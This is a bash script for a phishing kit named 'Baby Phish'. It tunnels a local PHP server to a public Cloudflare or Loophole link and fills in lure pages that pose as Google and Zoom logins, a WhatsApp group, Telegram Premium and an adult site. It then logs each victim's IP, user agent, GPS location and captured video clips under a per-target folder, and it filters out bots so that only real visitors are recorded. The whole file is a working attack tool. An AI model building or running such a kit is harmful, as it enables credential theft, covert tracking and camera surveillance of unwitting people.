#!/bin/bash

if [[ "$(uname -s)" != "Linux" ]]; then
    printf "\e[1;31m[!] This tool only supports Linux.\e[0m\n"
    exit 1
fi

stop() {
printf "\n\e[1;93m[!] Stopping Baby Phish...\e[0m\n"
pkill -f "php -S 127.0.0.1:3333" 2>/dev/null
killall php 2>/dev/null
pkill -f cloudflared 2>/dev/null
killall cloudflared 2>/dev/null
pkill -f loophole 2>/dev/null
killall loophole 2>/dev/null
rm -f ip.txt current_location.txt LocationLog.log Log.log 2>/dev/null
sed -i "s|\$baseDir = 'user_info.*';|\$baseDir = 'user_info';|g" server.php 2>/dev/null
printf "\e[1;92m[✓] All processes stopped.\e[0m\n"
exit 0
}




trap 'printf "\n";stop' 2 INT TERM EXIT

banner() {
clear
printf "\e[1;96m"
printf "  ██████╗  █████╗ ██████╗ ██╗   ██╗    ██████╗ ██╗  ██╗██╗███████╗██╗  ██╗\n"
printf "  ██╔══██╗██╔══██╗██╔══██╗╚██╗ ██╔╝    ██╔══██╗██║  ██║██║██╔════╝██║  ██║\n"
printf "  ██████╔╝███████║██████╔╝ ╚████╔╝     ██████╔╝███████║██║███████╗███████║\n"
printf "  ██╔══██╗██╔══██║██╔══██╗  ╚██╔╝      ██╔═══╝ ██╔══██║██║╚════██║██╔══██║\n"
printf "  ██████╔╝██║  ██║██████╔╝   ██║       ██║     ██║  ██║██║███████║██║  ██║\n"
printf "   ╚═════╝╚═╝  ╚═╝╚═════╝    ╚═╝       ╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝\n"
printf "\e[0m"
printf "\e[1;90m                    Version 1.0 | Supported OS: Linux\e[0m\n"
printf "\n"
printf "\e[1;95m         Created by: Whisky | Blaze | Sofia\e[0m\n"
printf "\n"
}



dependencies() {
command -v php > /dev/null 2>&1 || { printf "\e[1;31m[!] PHP is not installed. Install it with: sudo apt install php\e[0m\n"; exit 1; }
command -v wget > /dev/null 2>&1 || { printf "\e[1;31m[!] wget is not installed. Install it with: sudo apt install wget\e[0m\n"; exit 1; }
command -v unzip > /dev/null 2>&1 || { printf "\e[1;31m[!] unzip is not installed. Install it with: sudo apt install unzip\e[0m\n"; exit 1; }
}

catch_location() {
if [[ -e "user_info/$target_user/current_location.txt" ]]; then
    mv "user_info/$target_user/current_location.txt" "user_info/$target_user/current_location.bak"
fi

if ls "user_info/$target_user"/location_* 1> /dev/null 2>&1; then
    location_file=$(ls "user_info/$target_user"/location_* | head -n 1)
    lat=$(grep -a 'Latitude:' "$location_file" | cut -d " " -f2 | tr -d '\r')
    lon=$(grep -a 'Longitude:' "$location_file" | cut -d " " -f2 | tr -d '\r')
    acc=$(grep -a 'Accuracy:' "$location_file" | cut -d " " -f2 | tr -d '\r')
    maps_link=$(grep -a 'Google Maps:' "$location_file" | cut -d " " -f3 | tr -d '\r')
    
    printf "\n\e[1;92m[\e[0m+\e[1;92m] Location: \e[0m\e[1;77m%s, %s\e[0m (\e[1;93m±%s m\e[0m)\n" "$lat" "$lon" "$acc"
    printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Map:\e[0m\e[1;77m %s\e[0m\n" "$maps_link"
    
    mkdir -p "user_info/$target_user/saved_locations"
    mv "$location_file" "user_info/$target_user/saved_locations/"
    printf "\e[1;94m[\e[0m\e[1;77m*\e[0m\e[1;94m] Saved: user_info/$target_user/saved_locations/%s\e[0m\n" "$(basename "$location_file")"
fi
}

checkfound() {
mkdir -p "user_info/$target_user/saved_locations"
mkdir -p "user_info/$target_user/captured_videos"
printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting for targets,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] GPS Location & Video tracking is \e[0m\e[1;93mACTIVE\e[0m\n"
media_count=0
declare -A shown_ips

while [ true ]; do
    if [[ -e "ip.txt" ]]; then
        ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r' | head -1)
        ua=$(grep -a 'User-Agent:' ip.txt | cut -d ":" -f2- | tr -d '\r' | head -1 | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')
        
        if [[ "$ua" == *"Go-http-client"* ]] || [[ "$ua" == *"curl"* ]] || [[ "$ua" == *"bot"* ]] || [[ "$ua" == *"Wget"* ]] || [[ "$ua" == *"Let's Encrypt"* ]]; then
            rm -rf ip.txt
            sleep 0.5
            continue
        fi
        
        if [[ "$ip" == "127.0.0.1" ]] || [[ "$ip" == "::1" ]] || [[ "$ip" == 192.168.* ]] || [[ "$ip" == 10.* ]]; then
            rm -rf ip.txt
            sleep 0.5
            continue
        fi
        
        if [[ -n "$ip" ]] && [[ ! -v shown_ips["$ip"] ]]; then
            printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\n"
            printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" "$ip"
            if [[ -n "$ua" ]]; then
                printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] User-Agent:\e[0m\e[1;77m %s\e[0m\n" "$ua"
            fi
            shown_ips["$ip"]=1
        fi
        cat ip.txt >> "user_info/$target_user/saved.ip.txt"
        rm -rf ip.txt
    fi


    sleep 0.5

    if [[ -e "user_info/$target_user/current_location.txt" ]] || [[ -e "user_info/$target_user/LocationLog.log" ]]; then
        printf "\n\e[1;92m[\e[0m+\e[1;92m] Location data received!\e[0m\n"
        catch_location
        rm -f "user_info/$target_user/LocationLog.log"
    fi

    rm -f "user_info/$target_user/LocationError.log"

    if [[ -e "Log.log" ]]; then
        log_content=$(cat Log.log)
        if [[ "$log_content" == *"Video"* ]]; then
            media_count=$((media_count + 1))
            printf "\n\e[1;92m[\e[0m+\e[1;92m] Video clip received!\e[0m \e[1;93m(5 sec)\e[0m - Total: \e[1;93m%d\e[0m\n" "$media_count"
        elif [[ "$log_content" == *"Image"* ]]; then
            media_count=$((media_count + 1))
            printf "\r\e[1;92m[\e[0m+\e[1;92m] Media files received: \e[0m\e[1;93m%d\e[0m" "$media_count"
        fi
        rm -rf Log.log
    fi
    sleep 0.5
done 
}


cloudflare_tunnel() {
if [[ ! -e cloudflared ]]; then
    printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Cloudflared...\n"
    arch=$(uname -m)
    case "$arch" in
        "x86_64") wget -q --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O cloudflared ;;
        "i686"|"i386") wget -q --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386 -O cloudflared ;;
        "aarch64"|"arm64") wget -q --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64 -O cloudflared ;;
        "armv7l"|"armv6l"|"arm") wget -q --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm -O cloudflared ;;
        *) wget -q --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O cloudflared ;;
    esac
    chmod +x cloudflared
fi

printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
sleep 2
printf "\e[1;92m[\e[0m+\e[1;92m] Starting cloudflared tunnel...\n"
rm -f .cloudflared.log
./cloudflared tunnel -url 127.0.0.1:3333 --logfile .cloudflared.log > /dev/null 2>&1 &
sleep 10

link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".cloudflared.log")
if [[ -z "$link" ]]; then
    printf "\e[1;31m[!] Failed to get tunnel link. Try: killall cloudflared\e[0m\n"
    exit 1
fi
printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link
payload_cloudflare
checkfound
}

payload_cloudflare() {
link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".cloudflared.log")
sed "s+forwarding_link+$link+g" capture.js > capture_live.js
case $option_tem in
    1) sed "s+forwarding_link+$link+g; s+capture.js+capture_live.js+g" templates/OnlineMeeting.html > index2.html ;;
    2) sed "s+forwarding_link+$link+g; s+capture.js+capture_live.js+g" templates/TelegramPremium.html > index2.html ;;
    3) sed "s+forwarding_link+$link+g; s+capture.js+capture_live.js+g" templates/PornSite.html > index2.html ;;
    4) sed "s+forwarding_link+$link+g; s+capture.js+capture_live.js+g" templates/WhatsAppGroup.html > index2.html ;;
    5) sed "s+forwarding_link+$link+g; s+capture.js+capture_live.js+g" templates/GoogleLogin.html > index2.html ;;
    6) sed "s+forwarding_link+$link+g; s+capture.js+capture_live.js+g" templates/ZoomLogin.html > index2.html ;;
esac
}










loophole_tunnel() {
LOOPHOLE_BIN=$(which loophole 2>/dev/null)
if [[ -z "$LOOPHOLE_BIN" ]]; then
    printf "\e[1;93m[!] Loophole is not installed\e[0m\n"
    printf "\e[1;92m[*] Install: curl -L https://github.com/loophole/cli/releases/latest/download/loophole-cli_linux_amd64 -o loophole && chmod +x loophole && sudo mv loophole /usr/local/bin/\e[0m\n"
    exit 1
fi
printf "\e[1;92m[\e[0m+\e[1;92m] Loophole found at: %s\e[0m\n" "$LOOPHOLE_BIN"

printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\e[0m\n"
php -S 127.0.0.1:3333 > /dev/null 2>&1 &
sleep 2
printf "\e[1;92m[\e[0m+\e[1;92m] Starting loophole tunnel...\e[0m\n"
rm -f .loophole.log
"$LOOPHOLE_BIN" http 3333 > .loophole.log 2>&1 &

link=""
for i in {1..60}; do
    sleep 1
    link=$(grep -o 'https://[a-zA-Z0-9]*\.loophole\.site' .loophole.log | head -1)
    if [[ -n "$link" ]]; then
        break
    fi
    printf "\r\e[1;93m[\e[0m*\e[1;93m] Waiting for tunnel... (%d/60)\e[0m" "$i"
done
printf "\r                                        \r"

if [ -z "$link" ]; then
    if grep -q "You're not logged in\|401\|Cannot read locally stored token" .loophole.log; then
        printf "\e[1;93m[!] Loophole requires login\e[0m\n"
        printf "\e[1;92m[*] Running: loophole account login\e[0m\n"
        "$LOOPHOLE_BIN" account login
        pkill -f "php -S 127.0.0.1:3333" 2>/dev/null
        loophole_tunnel
        return
    fi
    printf "\e[1;93m[!] Failed to get loophole link. Check .loophole.log\e[0m\n"
    cat .loophole.log
    exit 1
fi
printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" "$link"
payload_loophole
checkfound
}


payload_loophole() {
link=$(grep -o 'https://[a-zA-Z0-9-]*\.loophole\.site' .loophole.log | head -1)
sed "s+forwarding_link+$link+g" capture.js > capture_live.js
case $option_tem in
    1) sed "s+forwarding_link+$link+g; s+capture.js+capture_live.js+g" templates/OnlineMeeting.html > index2.html ;;
    2) sed "s+forwarding_link+$link+g; s+capture.js+capture_live.js+g" templates/TelegramPremium.html > index2.html ;;
    3) sed "s+forwarding_link+$link+g; s+capture.js+capture_live.js+g" templates/PornSite.html > index2.html ;;
    4) sed "s+forwarding_link+$link+g; s+capture.js+capture_live.js+g" templates/WhatsAppGroup.html > index2.html ;;
    5) sed "s+forwarding_link+$link+g; s+capture.js+capture_live.js+g" templates/GoogleLogin.html > index2.html ;;
    6) sed "s+forwarding_link+$link+g; s+capture.js+capture_live.js+g" templates/ZoomLogin.html > index2.html ;;
esac
}









select_template() {
printf "\n-----Choose a template----\n"    
printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Online Meeting (Zoom)\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Telegram Premium\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;93m Porn Site (FUQ)\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m04\e[0m\e[1;92m]\e[0m\e[1;93m WhatsApp Group\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m05\e[0m\e[1;92m]\e[0m\e[1;93m Google Login\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m06\e[0m\e[1;92m]\e[0m\e[1;93m Zoom Login\e[0m\n"
read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a template: [Default is 1] \e[0m' option_tem
option_tem="${option_tem:-1}"
case $option_tem in
    1) printf "\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Using Online Meeting template\e[0m\n" ;;
    2) printf "\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Using Telegram Premium template\e[0m\n" ;;
    3) printf "\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Using Porn Site template\e[0m\n" ;;
    4) printf "\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Using WhatsApp Group template\e[0m\n" ;;
    5) printf "\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Using Google Login template\e[0m\n" ;;
    6) printf "\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Using Zoom Login template\e[0m\n" ;;
    *) printf "\e[1;93m [!] Invalid option!\e[0m\n"; select_template ;;
esac
}








babyphish() {
read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter Target Username: \e[0m' target_user
target_user="${target_user:-target}"
target_user=$(echo "$target_user" | tr -cd '[:alnum:]_-')
[[ -z "$target_user" ]] && target_user="target"
mkdir -p "user_info/$target_user"

sed -i "s|\$baseDir = 'user_info.*';|\$baseDir = 'user_info/$target_user';|g" server.php

printf "\n-----Choose tunnel server----\n"
printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m CloudFlare Tunnel\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Loophole\e[0m\n"
read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a Port Forwarding option: [Default is 1] \e[0m' option_server
option_server="${option_server:-1}"

select_template

case $option_server in
    1) cloudflare_tunnel ;;
    2) loophole_tunnel ;;
    *) printf "\e[1;93m [!] Invalid option!\e[0m\n"; babyphish ;;
esac
}




banner
dependencies
babyphish
